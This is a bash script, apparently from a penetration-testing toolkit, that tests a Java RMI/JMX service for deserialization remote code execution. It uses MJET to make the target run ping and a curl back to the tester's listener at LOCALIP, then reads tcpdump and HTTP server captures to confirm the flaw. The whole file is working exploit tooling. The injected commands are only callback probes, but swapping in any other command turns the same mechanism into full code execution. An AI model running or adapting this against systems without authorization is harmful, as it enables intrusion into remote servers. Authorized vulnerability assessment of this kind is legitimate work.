#!/usr/bin/env bash

print_title() {
        BOLD=$(tput bold ; tput setaf 4)
        NORMAL=$(tput sgr0)
        echo "${BOLD} $1 ${NORMAL}"
}

print_info() {
        BOLD=$(tput bold)
        BLUE=$(tput setaf 4)
        NORMAL=$(tput sgr0)
        echo "${BOLD}${BLUE}[~] ${NORMAL}${BLUE}$1 ${NORMAL}"
}


IP=$1
PORT=$2
LOCALIP=$3
PAYLOAD=$4
USERNAME=$5
PASSWORD=$6

echo
echo
print_title "================================================================="
print_title "          Java-RMI Deserialize in JMX (Anonymous Access)         " 
print_title "                 Check with MJET                                 "
print_title "================================================================="
echo

print_info "WARNING: This attack box must be reachable from the target !"
echo
print_info "Will try to ping local IP = ${LOCALIP} from target"

print_info "Running tcpdump in background to try to capture ICMP requests if service is vuln..."
sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &"
sleep 2
print_info "Alternatively, running HTTP server (port 8888/tcp) in background to try to capture HTTP requests if service is vuln..."
python3 -m http.server 8888 > /tmp/httptraffic.log 2>&1 &
sleep 2

print_info "Running Mjet command for target Linux:"
print_info "jython mjet.py --jmxrole ${USERNAME} --jmxpassword ${PASSWORD} ${IP} ${PORT} deserialize ${PAYLOAD} \"/bin/ping -c 4 ${LOCALIP}\""
jython mjet.py --jmxrole ${USERNAME} --jmxpassword ${PASSWORD} ${IP} ${PORT} deserialize ${PAYLOAD} "/bin/ping -c 4 ${LOCALIP}"

print_info "jython mjet.py --jmxrole ${USERNAME} --jmxpassword ${PASSWORD} ${IP} ${PORT} deserialize ${PAYLOAD} \"/usr/bin/ping -c 4 ${LOCALIP}\""
jython mjet.py --jmxrole ${USERNAME} --jmxpassword ${PASSWORD} ${IP} ${PORT} deserialize ${PAYLOAD} "/usr/bin/ping -c 4 ${LOCALIP}"

print_info "jython mjet.py --jmxrole ${USERNAME} --jmxpassword ${PASSWORD} ${IP} ${PORT} deserialize ${PAYLOAD} \"curl http://${LOCALIP}:8888/testexploit1337\""
jython mjet.py --jmxrole ${USERNAME} --jmxpassword ${PASSWORD} ${IP} ${PORT} deserialize ${PAYLOAD} "curl http://${LOCALIP}:8888/testexploit1337"

print_info "Wait a little bit..."
sleep 3
PID=$(ps -e | pgrep tcpdump)
print_info "Kill tcpdump (PID=${PID})"
sudo kill -9 $PID 2> /dev/null
sleep 2

PID=$(ps -e | pgrep -f -x 'python3 -m http.server 8888')
print_info "Kill python3 -m http.server (PID=$PID)"
sudo kill -9 $PID 2> /dev/null
sleep 2

print_info "Captured ICMP traffic:"
echo
sudo tcpdump -r /tmp/dump.pcap
echo
print_info "Delete capture"
sudo rm /tmp/dump.pcap

print_info "Captured HTTP traffic:"
echo
cat /tmp/httptraffic.log
echo
print_info "Delete capture"
sudo rm -f /tmp/httptraffic.log
echo


print_info "Restart tcpdump"
sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &"

print_info "Running jexboss command for target Windows:"
print_info "jython mjet.py --jmxrole ${USERNAME} --jmxpassword ${PASSWORD} ${IP} ${PORT} deserialize ${PAYLOAD} \"ping /n 4 ${LOCALIP}\""
jython mjet.py --jmxrole ${USERNAME} --jmxpassword ${PASSWORD} ${IP} ${PORT} deserialize ${PAYLOAD} "ping /n 4 ${LOCALIP}"

print_info "Wait a little bit..."
sleep 3
PID=$(ps -e | pgrep tcpdump)
print_info "Kill tcpdump (PID=${PID})"
sudo kill -9 $PID 2> /dev/null
sleep 2

print_info "Captured ICMP traffic:"
echo
sudo tcpdump -r /tmp/dump.pcap
echo
print_info "Delete capture"
sudo rm /tmp/dump.pcap

